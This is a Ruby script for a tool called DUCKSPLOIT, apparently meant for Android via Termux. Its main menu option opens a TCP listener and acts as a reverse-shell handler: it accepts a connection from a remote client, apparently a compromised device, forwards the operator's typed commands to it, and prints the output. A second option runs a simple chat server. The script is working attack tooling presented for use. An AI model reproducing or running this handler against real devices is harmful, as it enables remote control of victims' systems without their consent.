require "socket"
require "colorize"

host = "0.0.0.0"
port = 8015

chathost = "0.0.0.0"
chatport = 8012


loop do
	system("clear")
	puts " "
    puts "      \\____/     ".green.bold.blink
    puts "     /      \\    ".green.bold.blink
    puts "   _ |".green.bold.blink + "[] ".white.bold.blink + " []".white.bold.blink + "| _  ".green.bold.blink
    puts "  | ||______|| | ".green.bold.blink
    puts "  | ||      || | ".green.bold.blink
    puts "  |_||      ||_| ".green.bold.blink
    puts "     |  __  |    ".green.bold.blink
    puts "      ||  ||     ".green.bold.blink
    puts " "
    puts "DUCKSPLOIT - ANDROID ".yellow.bold.blink
    puts " POWERED BY TERMUX   ".yellow.bold.blink
	puts " ".green.bold.blink
	puts "  [".yellow.bold + "1".red.bold + "] Wait".yellow.bold
	puts "  [".yellow.bold + "2".red.bold + "] Open chat".yellow.bold
	puts "  [".yellow.bold + "3".red.bold + "] Visit our website".yellow.bold
	puts "  [".yellow.bold + "4".red.bold + "] Exit".yellow.bold
	puts " "
	print "Choose [1,2,3,4]: ".green.bold.blink
	menu = gets.chomp
	
	if menu == "1"
		server = TCPServer.new(host, port)
		puts "Listening on #{host}:#{port.to_s}"
		loop do
			puts "Waiting for connection"
			begin
				client = server.accept
				if true
					# currentDirCommand = client.gets
					sock_domain, remote_port, remote_hostname, remote_ip = client.peeraddr
					puts "Received connection from ".yellow.bold + "#{remote_ip}".green.bold
					loop do
						# client.puts "whoami"
						# whoami = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
						# client.puts currentDirCommand
						# cd = client.gets.gsub("\\NEWLINE", "\n").chomp.chomp
				
						puts " "
						puts "+--".red.bold + "(".red.bold  + "#{remote_ip}".green.bold + ")".red.bold + "-".red.bold + "[".red.bold + "~/Desktop".yellow.bold + "]".red.bold
						print "+-".red.bold + "$ ".green.bold
			

				
				
						cmd = gets.chomp
						client.puts cmd
				
				
						if cmd.downcase == "exit"
							puts "[".red.bold.blink + "~".white.bold.blink + "] Exiting...".red.bold.blink
							sleep(3)
							exit
					
						elsif cmd.downcase == "clear"
							system("clear")
				
						elsif cmd.downcase == "reload"
							puts "[".red.bold.blink + "~".white.bold.blink + "] Reloading...".red.bold.blink
							sleep(3)
							break
						end
						out = client.gets.chomp.gsub("\\NEWLINE", "\n")
				
						print out
					end
				else
					client.close
				end
			rescue Interrupt
				client.puts "exit"
				puts "\nExiting...".red.bold
				exit
			end
		end
	elsif menu == "2"
		system("clear")
		puts "Waiting for connections to chat...".green.bold.blink
		class Server
		def initialize( port, ip )
		    @server = TCPServer.open( ip, port )
		    @connections = Hash.new
		    @rooms = Hash.new
		    @clients = Hash.new
		    @connections[:server] = @server
		    @connections[:rooms] = @rooms
		    @connections[:clients] = @clients
		    run
		  end
 
		  def run
		    loop {
		      Thread.start(@server.accept) do | client |
		        nick_name = client.gets.chomp.to_sym
		        @connections[:clients].each do |other_name, other_client|
		          if nick_name == other_name || client == other_client
		            client.puts "[x] This username already exist".red.bold
		            Thread.kill self
		          end
		        end
		        puts "#{nick_name} #{client}"
		        @connections[:clients][nick_name] = client
		        client.puts "[o] Connection established!".red.bold
		        listen_user_messages( nick_name, client )
		      end
		    }.join
		  end
 
		  def listen_user_messages( username, client )
		    loop {
		      msg = client.gets.chomp
		      @connections[:clients].each do |other_name, other_client|
		        unless other_name == username
		          other_client.puts "#{username.to_s}".green.bold + "> ".yellow.bold + "#{msg}".green.bold.blink
		        end
		      end
		    }
		  end
		end
 
		Server.new( chatport, chathost )
		


	elsif menu == "3"
		system("xdg-open https://canarddu38.github.io/DUCKSPLOIT")
	elsif menu == "4"
		puts "[x] Exited successfully!".red.bold
		exit
	else
		puts "[x] Incorrect option (only 1,2 or 3)".red.bold
		sleep(2)
	end
end

